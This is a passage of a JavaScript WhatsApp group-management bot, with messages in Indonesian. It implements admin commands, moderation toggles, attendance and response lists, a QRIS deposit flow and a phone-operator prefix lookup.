  warnData[target].count = 0
  fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))

  await sock.sendMessage(m.chat, {
    text: `âœ… Warn @${target.split('@')[0]} berhasil dihapus`,
    mentions: [target]
  }, { quoted: fakeQuoted })
}
break
case 'antispam': {
    if (!isAdmins && !isOwner) return reply("Khusus admin!");

    if (args[0] === "on") {
        db.chats[m.chat].antispam = true;
        return reply("âœ”ï¸ AntiSpam berhasil diaktifkan!");
    } else if (args[0] === "off") {
        db.chats[m.chat].antispam = false;
        return reply("âŒ AntiSpam dimatikan!");
    } else {
        return reply(`â— Gunakan:
- antispam on
- antispam off`);
    }
}
break;
 case 'ubahnama':
  case 'setnamegc':
   case 'setsubject': { 
   if (!isGroup) return sock.sendMessage(m.chat, { text: 'ğŸš« Perintah ini hanya untuk grup.' }, { quoted: fakeQuoted }) 
   if (!isBotAdmins) return sock.sendMessage(m.chat, { text: 'ğŸš« Saya harus menjadi admin grup untuk mengubah nama.' }, { quoted: fakeQuoted }) 
   if (!isAdmins) return sock.sendMessage(m.chat, { text: 'ğŸš« Hanya admin grup yang dapat mengubah nama grup.' }, { quoted: fakeQuoted })

const subject = args.join(' ').trim()
if (!subject) return sock.sendMessage(m.chat, { text: `âš ï¸ Gunakan: ${prefix}ubahnama Nama Grup Baru` }, { quoted: fakeQuoted })

try {
  await sock.groupUpdateSubject(m.chat, subject)
  await sock.sendMessage(m.chat, { text: `âœ… Nama grup berhasil diubah menjadi:\n*${subject}*` }, { quoted: fakeQuoted })
} catch (err) {
  console.error('ERR set subject:', err)
  await sock.sendMessage(m.chat, { text: `âŒ Gagal mengubah nama grup. Error: ${err.message || err}` }, { quoted: fakeQuoted })
}

} break

  case 'ubahdesc': 
  case 'setdescgc': 
  case 'setdescription': { 
  if (!isGroup) return sock.sendMessage(m.chat, { text: 'ğŸš« Perintah ini hanya untuk grup.' }, { quoted: fakeQuoted }) 
  if (!isBotAdmins) return sock.sendMessage(m.chat, { text: 'ğŸš« Saya harus menjadi admin grup untuk mengubah deskripsi.' }, { quoted: fakeQuoted }) 
  if (!isAdmins) return sock.sendMessage(m.chat, { text: 'ğŸš« Hanya admin grup yang dapat mengubah deskripsi grup.' }, { quoted: fakeQuoted })

// Jika command dijalankan dengan reply ke pesan, gunakan teks yang di-reply sebagai deskripsi
const desc = (args.join(' ').trim()) || (m.quoted && m.quoted.text) || ''
if (!desc) return sock.sendMessage(m.chat, { text: `âš ï¸ Gunakan: ${prefix}ubahdesc Deskripsi baru\natau reply ke pesan yang berisi deskripsi.` }, { quoted: fakeQuoted })

try {
  await sock.groupUpdateDescription(m.chat, desc)
  await sock.sendMessage(m.chat, { text: `âœ… Deskripsi grup berhasil diubah.` }, { quoted: fakeQuoted })
} catch (err) {
  console.error('ERR set description:', err)
  await sock.sendMessage(m.chat, { text: `âŒ Gagal mengubah deskripsi grup. Error: ${err.message || err}` }, { quoted: fakeQuoted })
}

} break

case "swgc":
case "upswgc":
case "toswgc": {
  if (!m.isGroup) return reply(mess.group)
  if (!isAdmins && !isOwner) return reply(mess.admin)
  if (!isBotAdmins) return reply(mess.botadmin)

  async function groupStatus(jid, content) {
    const inside = await generateWAMessageContent(content, {
      upload: sock.waUploadToServer
    })
    const messageSecret = crypto.randomBytes(32)
    const msg = generateWAMessageFromContent(jid, {
      messageContextInfo: { messageSecret },
      groupStatusMessageV2: {
        message: {
          ...inside,
          messageContextInfo: { messageSecret }
        }
      }
    }, {})
    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id })
    return msg
  }

  const isQuoted = !!m.quoted
  const mime = isQuoted ? (m.quoted.mimetype || m.quoted.mtype) : null
  const caption = text?.trim() || ""
  let options = {}

  if (isQuoted) {
    const media = await m.quoted.download()
    if (/image/.test(mime)) options = { image: media, caption }
    else if (/video/.test(mime)) options = { video: media, caption }
    else if (/audio/.test(mime)) options = { audio: media, mimetype: "audio/mpeg", ptt: false }
    else return reply("âŒ Reply foto, video, atau audio!")
  } else if (caption) {
    options = { text: caption }
  } else {
    return reply(`Contoh:\n${prefix + command} ini caption\n(reply foto/video/audio)`)
  }

  await groupStatus(m.chat, options)
  await sock.sendMessage(m.chat, { react: { text: "âœ…", key: m.key } })
}
break
case 'listabsen': {
    if (!isAdmins) return reply(mess.admin)
    if (!m.isGroup) return reply(mess.group)
    if (db_absen[m.chat+hariini]) {
    let stringAbsen = `*\`LIST ABSEN [ ${hariini} ]\`*\n\n`
    stringAbsen += db_absen[m.chat+hariini].map(absen => `â­” @${absen.user_id.split('@')[0]} \n`).join('');    

    let arr_listabsen   = db_absen[m.chat+hariini].map(absen => ({ id: absen.user_id }));
    let jumlahOrangAbsen= arr_listabsen.length;
    let total_orgdgrub  = participants.length;

    let lomAbsen        = total_orgdgrub - jumlahOrangAbsen

    if (lomAbsen == 0) {
         stringAbsen += `\n*${jumlahOrangAbsen}* Orang Telah Absen Semua`
    }else{
         stringAbsen += `\n*${jumlahOrangAbsen}* Orang Telah Absen, Tersisa ${lomAbsen} Orang`
    }

    sock.sendMessage(m.chat, { text: stringAbsen, mentions: arr_listabsen.map(a => a.id) }, { quoted: fakeQuoted })

    } else{
        return reply('Belum ada absen hari ini')
    }
}
break
case 'absen': {
    if (!m.isGroup) return reply(mess.group)
    if (!db_absen[m.chat+hariini]) {

        // pertama absen
        db_absen[m.chat+hariini] = [{ user_id: sender, tanggal: hariini }];
        reply('Absen Berhasil')
    }else {

        // absen kedua
      const sudah_absen = db_absen[m.chat+hariini].findIndex(item => item.user_id === sender);

      if (sudah_absen !== -1) {
            reply('Kamu sudah absen hari ini')
        }else {
            reply('Absen Berhasil')
            db_absen[m.chat+hariini].push({ user_id: sender, tanggal: hariini });
        }
          
    }

 fs.writeFileSync('./database/absen.json', JSON.stringify(db_absen))

}
break
case "accall": {
    if (!m.isGroup) return reply("âŒ Fitur ini hanya bisa digunakan di grup!")
    if (!isAdmins) return reply("âŒ Hanya admin grup yang bisa menggunakan fitur ini!")
    if (!isBotAdmins) return reply("âŒ Jadikan bot sebagai admin terlebih dahulu!")

    try {
        let groupMetadata = await sock.groupMetadata(m.chat)
        let pendingRequests = await sock.groupRequestParticipantsList(m.chat)

        if (!pendingRequests || pendingRequests.length === 0)
            return reply("âœ… Tidak ada permintaan bergabung yang perlu disetujui!")

        for (let user of pendingRequests) {
            await sock.groupRequestParticipantsUpdate(m.chat, [user.jid], "approve")
        }

        reply(`âœ… Berhasil menerima semua *${pendingRequests.length}* permintaan bergabung di grup *${groupMetadata.subject}*!`)
    } catch (e) {
        console.log(e)
        reply("âŒ Terjadi kesalahan saat memproses permintaan!")
    }
}
break
case "rejectall": {
    if (!m.isGroup) return reply("âŒ Fitur ini hanya bisa digunakan di grup!")
    if (!isAdmins) return reply("âŒ Hanya admin grup yang bisa menggunakan fitur ini!")
    if (!isBotAdmins) return reply("âŒ Jadikan bot sebagai admin terlebih dahulu!")

    try {
        let groupMetadata = await sock.groupMetadata(m.chat)
        let pendingRequests = await sock.groupRequestParticipantsList(m.chat)

        if (!pendingRequests || pendingRequests.length === 0)
            return reply("âœ… Tidak ada permintaan bergabung yang perlu ditolak!")

        for (let user of pendingRequests) {
            await sock.groupRequestParticipantsUpdate(m.chat, [user.jid], "reject")
        }

        reply(`ğŸš« Semua *${pendingRequests.length}* permintaan bergabung di grup *${groupMetadata.subject}* telah ditolak.`)
    } catch (e) {
        console.log(e)
        reply("âŒ Terjadi kesalahan saat memproses penolakan!")
    }
}
break
case "add": {
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

  let nomor = args[0] ? args[0].replace(/[^0-9]/g, '') : '';
  if (!nomor) return reply('âŒ Masukkan nomor!\nContoh: .add 6281234567890');

  let userJid = nomor + '@s.whatsapp.net';

  try {
    // Coba langsung tambah ke grup
    const res = await sock.groupParticipantsUpdate(m.chat, [userJid], 'add');

    // Jika gagal tambah langsung, kirim invite
    const status = res[0]?.status;
    if (status === 403 || status === 408 || status === 401) {
      let inviteCode = await sock.groupInviteCode(m.chat);
      let inviteLink = `https://chat.whatsapp.com/${inviteCode}`;
      await sock.sendMessage(userJid, {
        text: `ğŸ‘‹ Halo! Kamu diundang untuk bergabung ke grup *${groupMetadata.subject}*\n\nKlik link di bawah untuk bergabung:\n${inviteLink}`
      });
      reply(`âœ… Tidak dapat menambah langsung.\nTapi undangan telah dikirim ke nomor: +${nomor}`);
    } else if (status === 200) {
      reply(`âœ… Berhasil menambahkan nomor +${nomor} ke grup!`);
    } else {
      reply(`âš ï¸ Gagal menambah nomor +${nomor}.`);
    }

  } catch (e) {
    console.error(e);
    reply('âŒ Terjadi kesalahan saat menambah member!');
  }

} break
case 'list': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply(`Khusus admin kak, dan jadikan bot admin terlebih dahulu`)
    if (db_respon_list.length === 0) return reply(`Belum ada list respon didalam database!`)
    if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Belum ada list respon didalam grup ini!`)

    // Ambil data list respon khusus grup ini
    let sections = []
    for (let i of db_respon_list) {
        if (i.id === m.chat) {
            sections.push({
                header: "List Respon",
                title: i.key.toUpperCase(),
                description: `Kirim *${i.key.toUpperCase()}* ke bot untuk detail.`,
                id: `${i.key}`
            })
        }
    }

    // Jika tidak ada data
    if (sections.length === 0) return reply(`Belum ada list respon di grup ini!`)

    // Buat button interaktif
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Halo ${pushname}, berikut list respon di grup ini.`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: name
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: `Klik Button Untuk Melihat List Respon`,
                        subtitle: name,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "single_select",
                                "buttonParamsJson": JSON.stringify({
                                    title: "List Respon",
                                    sections: [
                                        {
                                            title: `${name}`,
                                            rows: sections
                                        }
                                    ]
                                })
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: false,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '0@newsletter',
                            newsletterName: name,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: fakeQuoted })

    await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break

case 'addlist':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return (`khusus admin kak, dan jadikan bot admin terlebih dahulu`)
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${cmd} key|respon\n\nContoh: ${cmd} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List respon dengan key: ${args1}\nSudah ada digrup ini!`)
if (/image/.test(mime)) {
  let qw = m.quoted ? quoted : m
  let media = await sock.downloadAndSaveMediaMessage(qw)
  const url = await CatBox(media)
      addResponList(m.chat, args1, args2, true, url, db_respon_list)
      reply(`Sukses addlist respon\nKey: ${args1}`)
      if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
  addResponList(m.chat, args1, args2, false, '-', db_respon_list)
  reply(`Sukses addlist respon\nKey: ${args1}`)
}
break

case 'dellist':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return (`khusus admin kak, dan jadikan bot admin terlebih dahulu`)
if (db_respon_list.length === 0) return reply(`Belum ada list respon didalam database!`)
if (!text) return reply(`Gunakan dengan xara ${cmd} key\n\nContoh: ${cmd} tes`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`List respon dengan key: ${q}\ntidak ada didalam grup ini!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Sukses dellist respon dengan key: ${q}`)
break

case 'update':
case 'updatelist':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return (`khusus admin kak, dan jadikan bot admin terlebih dahulu`)
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${cmd} key|respon\n\nContoh: ${cmd} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar digrup ini!`)
if (/image/.test(mime)) {
  let qw = m.quoted ? quoted : m
  let media = await sock.downloadAndSaveMediaMessage(qw)
  const url = await CatBox(media)
      updateResponList(m.chat, args1, args2, true, url, db_respon_list)
      reply(`Berhasil update respon list dengan key *${args1}*`)
      if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
  updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
  reply(`Berhasil update respon list dengan key *${args1}*`)
}
break
case "addbadword": {
  if (!m.isGroup) return reply("Fitur ini khusus grup")
  if (!isAdmins) return reply("Khusus admin grup")

  if (!text) return reply("Contoh:\n.addbadword kontol")

  let chat = global.db.chats[m.chat]
  if (!chat) global.db.chats[m.chat] = { badwords: [] }
  if (!chat.badwords) chat.badwords = []

  let word = text.toLowerCase()

  if (chat.badwords.includes(word))
    return reply("Kata ini sudah ada di list")

  chat.badwords.push(word)
  reply(`âœ… Badword *${word}* berhasil ditambahkan`)
}
break

case "delbadword": {
  if (!m.isGroup) return reply("Fitur ini khusus grup")
  if (!isAdmins) return reply("Khusus admin grup")

  if (!text) return reply("Contoh:\n.delbadword kontol")

  let chat = global.db.chats[m.chat]
  if (!chat || !chat.badwords) return reply("Belum ada badword")

  let word = text.toLowerCase()
  let index = chat.badwords.indexOf(word)

  if (index === -1)
    return reply("Kata tidak ditemukan")

  chat.badwords.splice(index, 1)
  reply(`âœ… Badword *${word}* berhasil dihapus`)
}
break
case "listbadword": {
  if (!m.isGroup) return reply("Fitur ini khusus grup")

  let chat = global.db.chats[m.chat]
  if (!chat || !chat.badwords || chat.badwords.length === 0)
    return reply("ğŸ“­ Tidak ada badword di grup ini")

  let list = chat.badwords.map((v, i) => `${i + 1}. ${v}`).join("\n")
  reply(`ğŸ“› *DAFTAR BADWORDS GRUP*\n\n${list}`)
}
break
case "antitoxic":
case "antibadword": {
  if (!m.isGroup) return reply("Khusus grup")
  if (!isAdmins) return reply("Admin only")

  let chat = db.chats[m.chat]
  if (!chat) db.chats[m.chat] = {}

  if (args[0] === "on") {
    chat.antibadword = true
    reply("âœ… Anti Badword diaktifkan")
  } else if (args[0] === "off") {
    chat.antibadword = false
    reply("âŒ Anti Badword dimatikan")
  } else {
    reply("Contoh:\n.antibadword on / off")
  }
}
break
case 'antijudol':
    handleFeatureToggle('antijudol', command);
    break;

case 'antimention':
case 'antitagsw':
    handleFeatureToggle('antimention', command);
    break;

case 'antilink':
case 'antilinkgc':
    handleFeatureToggle('Antilinkgc', command);
    break;

case 'antilink3':
case 'antiwame':
    handleFeatureToggle('antiWame', command);
    break;

case 'antilink4':
case 'antilinkig':
    handleFeatureToggle('Antilinkig', command);
    break;
case 'mutegc':
case 'mute':
    handleFeatureToggle('mute', command);
    break;

case 'antilinkall':
    handleFeatureToggle('Antilinkall', command);
    break;
case 'antifoto':
    handleFeatureToggle('antifoto', command);
    break;
case 'antivideo':
    handleFeatureToggle('antivideo', command);
    break;
case 'onlyadmin':
    handleFeatureToggle('onlyadmin', command);
    break;
case 'autoaiv2':
case 'autoaivn':
    handleFeatureToggle('autoAi', command);
    break;
case 'autodl':
case 'autodownload':
    handleFeatureToggle('autodl', command);
    break;
/*



*/
case 'antiaudio':
    handleFeatureToggle('antiaudio', command);
    break;
case 'antidocument':
case 'antidokumen':
    handleFeatureToggle('antidokumen', command);
    break;
case 'antisticker':
case 'antistiker':
    handleFeatureToggle('antisticker', command);
    break;
    case "antilinkch":
    case "antichannel": {
  if (!m.isGroup) return reply("Khusus grup")
  if (!isAdmins) return reply("Admin only")

  let chat = db.chats[m.chat]
  if (!chat) db.chats[m.chat] = {}

  if (args[0] === "on") {
    chat.antichannel = true
    reply("âœ… Anti Channel diaktifkan")
  } else if (args[0] === "off") {
    chat.antichannel = false
    reply("âŒ Anti Channel dimatikan")
  } else {
    reply("Contoh:\n.antichannel on / off")
  }
}
break
case 'delete':
			case 'd':
			case 'del': {
			
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

				if (!m.quoted) return reply('Kak, kamu perlu mengirim pesan yang mau dihapus ya! ğŸ¤”')
				await sock.sendMessage(m.chat, {
					delete: {
						remoteJid: m.chat,
						id: m.quoted.id,
						participant: m.quoted.sender
					}
				})
			}
			break
			 case'dor': case "kick": case "kik": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await sock.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return reply("Nomor tidak terdaftar di whatsapp")
const res = await sock.groupParticipantsUpdate(m.chat, [input], 'remove')
await reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return reply("@tag/reply")
}
}

break
case "linkgc": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

const urlGrup = "https://chat.whatsapp.com/" + await sock.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await sock.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: fakeQuoted})
}

break
case "resetlinkgc": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

await sock.groupRevokeInvite(m.chat)
reply("Berhasil mereset link grup âœ…")
}

break
case "totag":{
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
 let users = participants.map(u => u.id).filter(v => v !== sock.user.jid)
 if (!m.quoted) return reply(`âœ³ï¸ Reply to a message`)
 sock.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: users } )
}
break
case 'closetime':

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
sock.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break

case "opentime": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Open Time ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
const nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nSekarang Member Dapat Mengirim Pesan`
sock.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}

break


case "demote":
case "promote": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await sock.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await sock.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: fakeQuoted})
})
} else {
return reply("@tag/6285###")
}
}

break
case 'delppgc':{

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

await sock.removeProfilePicture(from)
}
break
case 'setppgroup':
case 'setppgc': {
  if (!isGroup) return reply(mess.group);
  if (!isAdmins && !isOwner) return reply(mess.admin);
  if (!isBotAdmins) return reply(mess.botadmin);

  // ambil quoted / direct
  const quoted = m.quoted ? m.quoted : m;
  let mime = (quoted.msg || quoted).mimetype || quoted.mimetype || '';
  if (!mime) {
    if (quoted.message?.imageMessage) mime = 'image/jpeg';
    if (quoted.message?.documentMessage?.mimetype?.startsWith?.('image/')) 
      mime = quoted.message.documentMessage.mimetype;
  }

  if (!mime || !mime.includes('image')) return reply(`Kirim/Reply gambar dengan caption *${cmd}*`);
  if (mime.includes('webp')) return reply('Format WEBP tidak bisa jadi foto profil grup. Pakai JPG/PNG.');

  try {
    reply('â³ Sedang mengganti foto profil grup...');

    // download media -> Buffer
    let buffer = await sock.downloadMediaMessage(quoted);

    // 1) coba upload langsung (paling sering work)
    try {
      await sock.updateProfilePicture(m.chat, buffer);
      return reply('âœ”ï¸ Foto profil grup berhasil diganti (upload buffer)!');
    } catch (e1) {
      console.warn('[setppgc] updateProfilePicture(buffer) failed', e1);
    }

    // 2) fallback: kirim sebagai object { url: buffer } (beberapa versi menerima ini)
    try {
      await sock.updateProfilePicture(m.chat, { url: buffer });
      return reply('âœ”ï¸ Foto profil grup berhasil diganti (upload {url:buffer})!');
    } catch (e2) {
      console.warn('[setppgc] updateProfilePicture({url:buffer}) failed', e2);
    }

    // 3) optional: jika library punya helper generateProfilePicture -> gunakan untuk resize/crop
    try {
      // attempt access to helper (may be exported from lib or socket)
      const genFunc = sock.generateProfilePicture || (require('@whiskeysockets/baileys').generateProfilePicture);
      if (typeof genFunc === 'function') {
        const gen = await genFunc(buffer, { width: 720, height: 720 });
        const imgBuf = gen.img || buffer;
        await sock.updateProfilePicture(m.chat, imgBuf);
        return reply('âœ”ï¸ Foto profil grup berhasil diganti (generateProfilePicture)!');
      }
    } catch (e3) {
      console.warn('[setppgc] generateProfilePicture fallback failed', e3);
    }

    // tak ada yang berhasil
    reply('âŒ Gagal mengganti foto profil grup â€” coba cek permission bot (harus admin) atau ukuran/format gambar.');
  } catch (err) {
    console.error('[ERR setppgc]', err);
    reply('âŒ Terjadi error saat mengganti foto profil grup.');
  }
}
break;
case 'tagall':{
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
const textMessage = args.join(" ") || "nothing";
let teks = `tagall message :\n> *${textMessage}*\n\n`;
const groupMetadata = await sock.groupMetadata(m.chat);
const participants = groupMetadata.participants;
for (let mem of participants) {
teks += `@${mem.id.split("@")[0]}\n`;
}
sock.sendMessage(m.chat, {
text: teks,
mentions: participants.map((a) => a.id)
}, { quoted: fakeQuoted });
}
break         
case "h":
case "hidetag": {
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
if (m.quoted) {
sock.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
sock.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, { quoted: fakeQuoted })
}
}
break 
case "closegc": case "close": 
case "opengc": case "open": {
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
if (/open|opengc/.test(command)) {
if (groupMetadata.announce == false) return 
await sock.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (groupMetadata.announce == true) return 
sock.groupSettingUpdate(m.chat, 'announcement')
} else {}
}

break        
case 'afk': {
if (!m.isGroup) return reply(mess.group);
 let reason = text ? text : 'Coli'

 // Cek kalau user udah afk
 if (afk.checkAfkUser(m.sender, _afk)) {
 return reply('Kan udah tadiğŸ˜ .')
 }

 let obj = {
 id: m.sender,
 time: Date.now(),
 reason
 }
 _afk.push(obj)
 fs.writeFileSync('./database/user.json', JSON.stringify(_afk))

 sock.sendMessage(m.chat, {text:`@${m.sender.split("@")[0]} menghilang dari lane\n\n*Reason:* ${reason}`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
break;         

/*
    OTHER
*/

// ================= CASE DEPOSIT =================
case 'deposit': {
 if (!text) return reply('âŒ Contoh: .deposit 2000')
 const nominal = parseInt(text)
 if (isNaN(nominal)) return reply('âŒ Nominal tidak valid')

 try {
   const create = await axios.post(`${CI_BASE}/create`, {
     api_key: CI_APIKEY,
     nominal,
     method: "QRISFAST",
     fee_by_customer: false,
     reff_id: `deposit-${Date.now()}`
   })

   const data = create.data.data

   const buttons = [
     { buttonId: `.cekdeposit`, buttonText: { displayText: 'ğŸ”„ CEK STATUS' }, type: 1 },
     { buttonId: `.canceldeposit`, buttonText: { displayText: 'âŒ CANCEL' }, type: 1 }
   ]

   const sent = await sock.sendMessage(m.chat, {
     image: { url: data.qr_image_url },
     caption: `
ğŸ’³ *DEPOSIT QRIS*
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ†” ID : ${data.id}
ğŸ’° Nominal : Rp ${data.nominal}
ğŸ’¸ Fee : Rp ${data.fee}
ğŸ’µ Diterima : Rp ${data.get_balance}
â° Expired : ${data.expired_at}
ğŸ“Œ Status : *PENDING*
`,
     buttons,
     headerType: 4
   }, { quoted: m })

   global.depositData[m.sender] = {
     id: data.id,
     msgKey: sent.key
   }

   // AUTO CHECK STATUS
   const interval = setInterval(async () => {
     try {
       const cek = await axios.post(`${CI_BASE}/status`, {
         api_key: CI_APIKEY,
         id: data.id
       })

       if (cek.data.data.status === "success") {
         clearInterval(interval)

         await sock.sendMessage(m.chat, {
           delete: global.depositData[m.sender]?.msgKey
         })

         delete global.depositData[m.sender]

         await sock.sendMessage(m.chat, {
           text: `âœ… *DEPOSIT BERHASIL!*\nğŸ’° Rp ${cek.data.data.get_balance}`
         }, { quoted: m })
       }
     } catch {}
   }, 15000)

 } catch {
   reply('âŒ Gagal membuat deposit')
 }
}
break


// ================= CEK STATUS =================
case 'cekdeposit': {
 const data = global.depositData[m.sender]
 if (!data) return reply('âŒ Tidak ada deposit aktif')

 const cek = await axios.post(`${CI_BASE}/status`, {
   api_key: CI_APIKEY,
   id: data.id
 })

 reply(`ğŸ“Œ Status Deposit: *${cek.data.data.status.toUpperCase()}*`)
}
break


// ================= CANCEL DEPOSIT =================
case 'canceldeposit': {
 const data = global.depositData[m.sender]
 if (!data) return reply('âŒ Tidak ada deposit aktif')

 try {
   await axios.post(`${CI_BASE}/cancel`, {
     api_key: CI_APIKEY,
     id: data.id
   })

   await sock.sendMessage(m.chat, {
     delete: data.msgKey
   })

   delete global.depositData[m.sender]

   reply('âŒ Deposit dibatalkan & QRIS dihapus')
 } catch {
   reply('âŒ Gagal membatalkan deposit')
 }
}
break
case "ptv": {
    if (!text) {
        return reply(
            `âš ï¸ Contoh:\n` +
            `â€¢ *.${command} kucing*\n` +
            `â€¢ *.${command} kucing.162288@g.us* (owner)`
        );
    }

    let query, targetId;

    // cek apakah ada target
    if (text.includes('.')) {
        [query, targetId] = text.split('.');

        // jika pakai target â†’ owner only
        if (!isOwner) {
            return reply("â›” Fitur kirim ke ID hanya untuk OWNER!");
        }
    } else {
        query = text;
        targetId = m.chat; // kirim ke chat sekarang
    }

    let search = await tiktokSearchVideo(query);
    if (!search.videos || search.videos.length === 0) {
        return reply("âŒ Video tidak ditemukan");
    }

    let videoUrl = `https://tikwm.com${search.videos[0].play}`;

    await sock.sendMessage(
        targetId,
        {
            video: { url: videoUrl },
            mimetype: 'video/mp4',
            ptv: true,
            viewOnce: true
        },
        { quoted: fakeQuoted }
    );
}
break;
case 'ceksim': {
 if (!text) return reply('Masukkan nomor HP\n\nContoh:\n.ceksim 08123456789')

 let num = text.replace(/[^0-9]/g, '')
 if (num.startsWith('62')) num = '0' + num.slice(2)

 const prefix = num.substring(0, 4)

 const operator = {
 // TELKOMSEL
 '0811': 'Telkomsel (Halo)',
 '0812': 'Telkomsel (Simpati)',
 '0813': 'Telkomsel (Simpati)',
 '0821': 'Telkomsel',
 '0822': 'Telkomsel',
 '0823': 'Telkomsel',
 '0852': 'Telkomsel',
 '0853': 'Telkomsel',
 '0851': 'Telkomsel',

 // INDOSAT
 '0814': 'Indosat (M2)',
 '0815': 'Indosat',
 '0816': 'Indosat',
 '0855': 'Indosat',
 '0856': 'Indosat',
 '0857': 'Indosat',
 '0858': 'Indosat',

 // XL
 '0817': 'XL',
 '0818': 'XL',
 '0819': 'XL',
 '0859': 'XL',
 '0877': 'XL',
 '0878': 'XL',

 // AXIS
 '0831': 'Axis',
 '0832': 'Axis',
 '0833': 'Axis',
 '0838': 'Axis',

 // TRI
 '0895': 'Tri (3)',
 '0896': 'Tri (3)',
 '0897': 'Tri (3)',
 '0898': 'Tri (3)',
